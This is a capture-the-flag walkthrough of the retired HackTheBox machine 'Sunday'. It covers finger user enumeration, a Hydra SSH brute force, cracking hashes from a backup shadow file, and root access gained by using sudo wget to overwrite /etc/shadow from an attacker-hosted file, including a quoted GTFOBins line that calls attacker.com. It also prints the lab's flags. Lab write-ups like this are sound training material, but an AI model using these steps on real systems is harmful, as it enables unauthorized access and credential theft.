# Sunday
## HackTheBox
### Easy (retired)

IP: 10.129.234.47

#### NMAP
PORT      STATE SERVICE   REASON         VERSION
* 79/tcp    open  finger    syn-ack ttl 59 Sun Solaris fingerd
    finger: No one logged on\x0D
* 111/tcp   open  rpcbind   syn-ack ttl 63 2-4 (RPC #100000)
* 22022/tcp open  ssh       syn-ack ttl 59 SunSSH 1.3 (protocol 2.0)

* 36077/tcp open  smserverd syn-ack ttl 59 1 (RPC #100155)
* 47822/tcp open  unknown   syn-ack ttl 63

79,111,22022,36077,47822

PORT   STATE SERVICE VERSION
79/tcp open  finger  Sun Solaris fingerd
  finger: No one logged on\x0D
  Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos

#### Port 79 - Finger
* Used finger daemon to see if any users are logged in.
  * No users
* Used script [finger-user-enum v1.0](http://pentestmonkey.net/tools/finger-user-enum) to brute-force users.

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /SecLists-master/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Mon Oct 11 08:24:44 2021 #########
* access@10.129.234.95: access No Access User < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym < .  .  .  . >..
* admin@10.129.234.95: Login Name TTY Idle When Where..adm Admin < .  .  .  . >..lp Line Printer Admin < .  .  .  . >..uucp uucp Admin < .  .  .  . >..nuucp uucp Admin < .  .  .  . >..dladm Datalink Admin < .  .  .  . >..listen Network Admin < .  .  .  . >..
* anne marie@10.129.234.95: Login Name TTY Idle When Where..anne ???..marie ???..
* bin@10.129.234.95: bin ??? < .  .  .  . >..
* dee dee@10.129.234.95: Login Name TTY Idle When Where..dee ???..dee ???..
* jo ann@10.129.234.95: Login Name TTY Idle When Where..jo ???..ann ???..
* la verne@10.129.234.95: Login Name TTY Idle When Where..la ???..verne ???..
* line@10.129.234.95: Login Name TTY Idle When Where..lp Line Printer Admin
* message@10.129.234.95: Login Name TTY Idle When Where..smmsp SendMail Message Sub 
* miof mela@10.129.234.95: Login Name TTY Idle When Where miof ???..mela ???..
* root@10.129.234.95: root Super-User pts/3 Apr 24, 2018
* sammy@10.129.234.95: sammy console Sep 30, 2020
* sunny@10.129.234.95: sunny pts/3 Apr 24, 2018 10.10.14.4
* sys@10.129.234.95: sys
* zsa zsa@10.129.234.95

Checked all logins with `finger` with the following results:
```Console
[10.129.234.95]
Login       Name               TTY         Idle    When    Where
nobody   NFS Anonymous Access               < .  .  .  . >
noaccess No Access User                     < .  .  .  . >
nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >

Login       Name               TTY         Idle    When    Where
adm      Admin                              < .  .  .  . >
lp       Line Printer Admin                 < .  .  .  . >
uucp     uucp Admin                         < .  .  .  . >
nuucp    uucp Admin                         < .  .  .  . >
dladm    Datalink Admin                     < .  .  .  . >
listen   Network Admin                      < .  .  .  . >

Login       Name               TTY         Idle    When    Where
root     Super-User            pts/3        <Apr 24, 2018> sunday

Login       Name               TTY         Idle    When    Where
sammy    sammy                 console      <Sep 30, 2020>

Login       Name               TTY         Idle    When    Where
sunny    sunny                 pts/3        <Apr 24, 2018> 10.10.14.4
```

* Brute force ssh with Hydra
root
sammy
sunny

Password found:
```
╰─ hydra -t 32 -L hydraUsers -P /Volumes/TerraRyzing/Tools/SecLists-master/Passwords/10k\ most\ common.txt ssh://10.129.234.95:22022
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-11 12:56:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 32 tasks per 1 server, overall 32 tasks, 30000 login tries (l:3/p:10000), ~938 tries per task
[DATA] attacking ssh://10.129.234.95:22022/
[STATUS] 483.00 tries/min, 483 tries in 00:01h, 29582 to do in 01:02h, 32 active
[STATUS] 417.00 tries/min, 1251 tries in 00:03h, 28814 to do in 01:10h, 32 active
[STATUS] 370.71 tries/min, 2595 tries in 00:07h, 27470 to do in 01:15h, 32 active
[STATUS] 365.00 tries/min, 5475 tries in 00:15h, 24590 to do in 01:08h, 32 active
[STATUS] 357.29 tries/min, 11076 tries in 00:31h, 18989 to do in 00:54h, 32 active
[STATUS] 357.68 tries/min, 16811 tries in 00:47h, 13254 to do in 00:38h, 32 active
[22022][ssh] host: 10.129.234.95   login: sunny   password: sunday
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-11 13:57:33
```
login: sunny
password: sunday

* Attempted to connect via `ssh` but received an error:
```Console
Unable to negotiate with 10.129.234.154 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
```

Visited the [OpenSSH website](https://www.openssh.com/legacy.html)
> The best resolution for these failures is to upgrade the software at the other end and/or replace the weak key types with safer modern types.
> OpenSSH only disables algorithms that we actively recommend against using because they are known to be weak. This might not be immediately
> possible in some cases, so you may need to temporarily re-enable the weak algorithms to retain access.
> 
> For the case of the above error message, OpenSSH can be configured to enable the diffie-hellman-group1-sha1 key exchange algorithm (or any
> other that is disabled by default) using the KexAlgorithms option, either on the command line:
> 
> `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@legacyhost`

* Able to connect with the following:
`ssh -oKexAlgorithms=diffie-hellman-group-exchange-sha1 -p 22022 sunny@10.129.234.154`

#### Sunny
Does not have user flag. Found under user: Sammy, but lack permissions.

#### Pivot
Found a file in `/backup` called `shadow.backup` containing:
```Console
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
sunny@sunday:/backup$ pwd
/backup
```

Actual credentials:
```
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::
```

* NTH:
Most Likely
SHA-256 Crypt, HC: 7400 JtR: sha256crypt

* Run through JtR
```
╰─ john user_hashes --format=sha256crypt --wordlist=/Volumes/TerraRyzing/Tools/SecLists-master/Passwords/Leaked-Databases/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (sha256crypt, crypt(3) $5$ [SHA256 128/128 SSE4.1 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
sunday           (?)
cooldude!        (?)
2g 0:00:02:50 DONE (2021-10-11 15:09) 0.01170g/s 1191p/s 1205c/s 1205C/s coolll..cocoa16
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

* switched user to `sammy` and reached the user flag.
User flag: a3d9498027ca5187ba1793943ee8a598

#### Privesc
```Console
sunny@sunday:/export/home/sammy/Desktop$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
```

* Per [GTFOBins](https://gtfobins.github.io/gtfobins/wget/#sudo)
> If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
> 
>     Fetch a remote file via HTTP GET request.
> ```
>     URL=http://attacker.com/file_to_get
>     LFILE=file_to_save
>     sudo wget $URL -O $LFILE
> ```


* Hypothesis: edit the backup file and write it to the /etc/shadow file with existing hash

1. Copy contents found in sunny's backup file into a file on attack machine called `shadow`
2. Create an entry for `root` using sammy or sunny's hash
3. From target: `sudo wget -O /etc/shadow http://ip-address/shadow`
4. Since `wget` has `sudo` privileges, it will allow the existing `/etc/shadow` file to be overwritten as the outfile provided to `wget`
5. Executed `su`:

sunny@sunday:/backup$ su
Password:
sunny@sunday:/backup# whoami
root

Root flag: fb40fab61d99d37536daeec0d97af9b8
